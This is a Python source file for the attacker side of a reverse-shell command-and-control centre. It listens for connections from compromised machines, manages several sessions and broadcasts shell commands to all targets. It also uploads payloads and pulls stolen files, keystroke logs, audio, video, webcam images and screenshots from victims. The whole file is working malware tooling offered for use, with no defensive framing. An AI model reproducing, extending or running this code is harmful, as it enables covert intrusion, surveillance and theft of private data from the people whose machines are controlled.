#!/usr/bin/python

import socket as sc
import json
import os, sys
import base64
import threading
from termcolor import colored
import subprocess as sp
from datetime import datetime
from time import sleep




def SendAll(target, data):
	Data = json.dumps(data)
	target.send(Data)




def shell(target, ip):

	print(colored("[+] Connection established from target " + ip[0] + "\n", "green"))

	def Send(data):
		Data = json.dumps(data)
		target.send(Data)


	def Recv():
		data = ""
		while True:
			try:																	# tries to receive 1024 bytes of data from target
				data = data + target.recv(1024)							# decodes the utf-8 encoded as sent by the Send() function
				return json.loads(data)
			except ValueError:														# ValueError signifies that the data to be received is larger than 1024 bytes
				continue															# goes back to the loop iteration and adds the remaining data from the execution of try block



	SYS_flag = 0
	Send("pwd")
	if Recv().strip()[0] != '/':
		SYS_flag = 1
		
	# flag = 0 indicates a Linux/ UNIX based system
	if SYS_flag == 0:
		Send('uname -r')
		print("[!] Target System OS Name: " + Recv().strip())
		print("[*] Please issue command \"uname -a\" for more system information.")
	# otherwise, it is a Windows based system
	else:
		Send('systeminfo | findstr "OS"')
		print("[!] Target System " + Recv().split('\n')[0])												# Windows returns 4-5 lines (separated by \n) containing the string "OS" ... first line shows the os name
		print("[*] Please issue command \"systeminfo\" for more system information.")
	print("[*] Type \"help\" for a list of commands that can be issued!\n")
	
	while True:

		if SYS_flag == 0:
			Send("pwd")																							# this Send of pwd command is to show the PWD as shown in the console for Linux system
		else:
			Send("cd")																							# this Send of cd command is to show the PWD as shown in the console for Windows system
		command = raw_input("Shell @ " + str(ip[0]) + ":" + Recv().strip() + "# ")								# an input line similar to the console is made using the PWD result from above
		
		Send(command)																						# now the actual command entered by the user is sent
		
		# command to stop the reverse_shell operations
		#==============================================
		if (command == 'exit'):
			print("[!] " + str(ip[0]) + ": Stopping the reverse shell handler on port " + str(ip[1]))
			target.close()
			return True																							# returns the bool to check whether the connection needs to be closed from the Controller side
		
		elif (command == 'quit'):
			print("[!] " + str(ip[0]) + ": Handler is pushed to the background and can be resumed.")
			break

		# the GET command [pulling files from target to attacker]							Sample command : download <FILE.TXT>
		#=========================================================	
		elif (command[:3] == 'get'):
			try:
				if (SYS_flag == 0) and (len(command[4:].split('/')) > 1):
					file = open(command[4:].split('/')[-1], "wb")
				elif (SYS_flag == 1) and (len(command[4:].split('\\')) > 1):
					file = open(command[4:].split('\\')[-1], "wb")
#				with open(command[4:], "wb") as file:
				else:
					file = open(command[4:], "wb")
				file_data = Recv()
				file.write(base64.b64decode(file_data))					# the base64 decoding is done to handle non-text file types (such as images) which can't be written directly
				print(colored("[+] File " + command[4:] + " downloaded at "+ sp.check_output('pwd').decode(), "green"))
				file.close()
			except Exception as e:
				print(e)
				print(colored("[-] Failed to download file " + command[4:], "red"))


		
		# the PUT command [injecting files from attacker to victim]									Sample command : upload <PAYLOAD.EXE>
		#===========================================================					
		elif (command[:3] == 'put'):
			try:
				with open(command[4:], "rb") as file:
					Send(base64.b64encode(file.read()))						# while sending a file, the data is encoded (whcich will then be decodedd in our target system, as we have decoded received file above )
					res = Recv()
					if res[1] == '+':
						print(colored(res, "green"))
					else:
						print(colored(res, "red"))
			except Exception as e:											# catching the exception here for debugging purposes - to print the error message 
				print("[!] " + str(e))
				print(colored("[-] Failed to upload file " + command[4:], "red"))
				pass

		
		
		# the START KEYLOGGER command triggers the keylogger program to run on the target machine and record keystrokes
		#===============================================================================================================
		elif (command == "start keylogger") or (command == "stop keylogger"):
			if command [:4] == 'stop':
				print("[!] Stopping the keylogger on the target system. Please wait...")
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
			
		# dump the recorded keystrokes from target to attacker machine
		#==============================================================	
		elif (command == "dump keys"):
			with open("KeyLog" + str(datetime.now()) + ".log", "w") as log:
				print("[!] Trying to locate and retrieve recorded keystrokes. Please wait...")
				try:

					keylog = Recv()
					if keylog[:3] == '[-]':
						print(colored(keylog, "red"))
					else:
						log.write(keylog)
						print(colored("[+] Log file with key record saved at "+ sp.check_output('pwd').decode(), "green"))

				except Exception as e:
					print(colored("[!] " + str(e), "red"))



		# the START RECORDING command triggers the keylogger program to run on the target machine and record keystrokes
		#===============================================================================================================
		elif (command == "start recording") or (command == "stop recording"):
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
			
		# dump the recorded audio file from target to attacker machine
		#==============================================================	
		elif (command == "record"):
			with open("AudioRecording" + str(datetime.now()) + ".wav", "wb") as audiorec:
				print("[!] Trying to locate and retrieve recorded audio. Please wait...")
				try:
					audio_data = Recv()
					audiorec.write(base64.b64decode(audio_data))
					print(colored("[+] Recorded audio file with date-time-stamp saved at "+ sp.check_output('pwd').decode(), "green"))
				except Exception as e:
					print(colored("[!] " + str(e), "red"))
			

		elif (command == "start video") or (command == "stop video"):
			try:
				print(colored(Recv(), "green"))
			except Exception as e:
				print(colored("[!] " + str(e), "red"))
		
		
		
		elif (command == "dump video"):
			with open("VideoRecording" + str(datetime.now()) + ".mp4", "wb") as videorec:
				print("[!] Trying to locate and retrieve recorded video. Please wait...")
				try:
					video_data = Recv()
					videorec.write(base64.b64decode(video_data))
					print(colored("[+] Recorded audio file with date-time-stamp saved at "+ sp.check_output('pwd').decode(), "green"))
				except Exception as e:
					print(colored("[!] " + str(e), "red"))
		
		
		elif (command == "capture image"):
			try:
				with open("ImageCapture"+str(datetime.now()), "wb") as img:
					img_data = Recv()
					if base64.b64decode(img_data)[1] == '-':
						print(colored(Recv(), "red"))
					else:
						img.write(base64.b64decode(img_data))
						print(colored("[+] Captured image saved at "+ sp.check_output('pwd').decode(), "green"))
			except Exception as e:
				print(e)
				print(colored("[-] Failed to save captured image!", "red"))


		# the SS command tries to capture a screenshot of the target system and send it to the attacker
		#===============================================================================================
		elif (command[:2] == 'ss'):
			try:
				with open("Screenshot"+str(datetime.now()), "wb") as ss:
					ss_data = Recv()
					if base64.b64decode(ss_data)[1] == '-':
						print(colored(Recv(), "red"))
					else:
						ss.write(base64.b64decode(ss_data))
						print(colored("[+] Screenshot saved at "+ sp.check_output('pwd').decode(), "green"))
			except Exception as e:
				print(e)
				print(colored("[-] Failed to save Screenshot!", "red"))

		# for all other commands [those not mentioned above or needs any special handling]
		#==================================================================================
		else:
			try:
				print(Recv())
			except Exception as e:
				print(colored("[!] " + str(e), "red"))




def server():

	global clients, stop_thread, targets, ips, sock
	while True:
		if stop_thread:
			break
		sock.settimeout(1)
		
		try:
			target, ip = sock.accept()
			targets.append(target)
			ips.append(ip)
			print(colored("[+] Target" + str(ips[clients][0]) + " : " + str(ips[clients][1]) + " has CONNECTED", "green"))
			print("Press Enter to continue to the C&CC Shell.")
			clients += 1
		except:
			pass



help_options = '''\nNote:- All the following commands are Case Sensitive!\n\tAlso please do not confuse them with respective system shell commands!\n
\t(1) help\t\t\t:\tShow this Help menu
\t(2) sessions\t\t\t:\tShow the active C&CC sessions
\t(3) session <SESSION_ID>\t:\tSwitch to the corresponding target\n\t\t\t\t\t\tof the specified Session ID
\t(4) sendall <SHELL_COMMAND>\t:\tSend the <SHELL_COMMAND> to\n\t\t\t\t\t\tall connected target systems at once\n\t\t\t\t\t\tNote: Must be a compatible SHELL COMMAND only!
\t(5) exit/ quit\t\t\t:\tExit the Command and Control Center\n'''




targets = []
ips = []
clients = 0
stop_thread = False

attack_ip = "192.168.0.103"
listen_port = 54321

sock = sc.socket(sc.AF_INET, sc.SOCK_STREAM)
sock.setsockopt(sc.SOL_SOCKET, sc.SO_REUSEADDR, 1)
sock.bind((attack_ip, listen_port))
sock.listen(5)

print("[!] Waiting for incoming connections on Port " + str(listen_port) + "...")
sleep(3)
try:
	serv_thread = threading.Thread(target=server)
	serv_thread.start()
except:
	print(colored("[-] Server initialisation failed!", "red"))

	
while True:

	command = raw_input("\n[*] Command and Control Centre >>> ")
	
	if command == 'sessions':
		cnt = 1
		if len(ips) < 1:
			print(colored("[!] No active session found!\n", "red"))
			continue
		for ip in ips:
			print("Session-" + str(cnt) + " <---> " + str(ip[0]) + ": " + str(ip[1]) + "\n")
			cnt += 1
		
	elif command[:7] == 'session' and command[8:].isdigit():
		try:
			sess_num = int(command[8:])
			tar_num = sess_num-1
			sess_target = targets[tar_num]
			sess_ip = ips[tar_num]
			print("[!] Trying to connect to target " + sess_ip[0])
			sleep(1)
			close_request = shell(sess_target, sess_ip)
			if close_request:																										# on exit, the shell() function returns true
				targets.remove(sess_target)																							# the list elements containing the corresponding entries
				ips.remove(sess_ip)																									# along with their IPs are deleted
		except:	
			print(colored("[!] No session found under session ID " + str(sess_num) + "\n", "red"))
		
	elif command == 'exit' or command == 'quit':
		print("\n[!] Quitting the Command and Control Center on IP = " + attack_ip + " at Port = " + str(listen_port))
		for target in targets:
			target.close()
		sock.close()
		stop_thread = True
		serv_thread.join()
		quit()

	elif command[:7] == 'sendall':
		i = 0
		try:
			while i < len(targets):
				tgt = targets[i]
				SendAll(tgt, command)
				print("[!!] Command: " + command [8:] + " executed on Target: " + ips[i][0])
				i += 1
		except Exception as e:
			print(colored("[!!] " + str(e), "red"))

	elif command == 'help':
		print(help_options)
	else:
		print(help_options)

